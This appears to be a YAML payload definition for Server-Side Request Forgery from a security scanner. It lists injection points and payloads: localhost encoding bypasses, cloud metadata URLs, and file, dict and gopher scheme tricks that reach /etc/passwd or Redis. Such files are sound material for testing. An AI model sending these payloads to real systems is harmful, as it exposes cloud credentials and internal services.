id: ssrf
name: Server-Side Request Forgery
severity_range: [medium, critical]

injection_points:
  - url_parameters
  - webhook_urls
  - import_urls
  - pdf_generators
  - image_fetchers

payloads:
  basic:
    - "http://127.0.0.1"
    - "http://localhost"
    - "http://0.0.0.0"
    - "http://[::1]"

  ip_bypass:
    decimal: "http://2130706433"
    hex: "http://0x7f000001"
    octal: "http://0177.0.0.01"
    ipv6: "http://[::ffff:127.0.0.1]"
    short: "http://127.1"
    enclosed: "http://①②⑦.⓪.⓪.①"

  cloud_metadata:
    aws: "http://169.254.169.254/latest/meta-data/"
    gcp: "http://metadata.google.internal/computeMetadata/v1/"
    azure: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
    digital_ocean: "http://169.254.169.254/metadata/v1/"

  scheme_bypass:
    - "file:///etc/passwd"
    - "dict://127.0.0.1:6379/info"
    - "gopher://127.0.0.1:25/"
    - "ftp://127.0.0.1"

  dns_rebinding:
    - "http://attacker-controlled-dns.com"

detection:
  direct: "response contains internal resource content"
  blind: "interaction received on attacker-controlled callback server"
  error_based: "different error messages for internal vs external hosts"
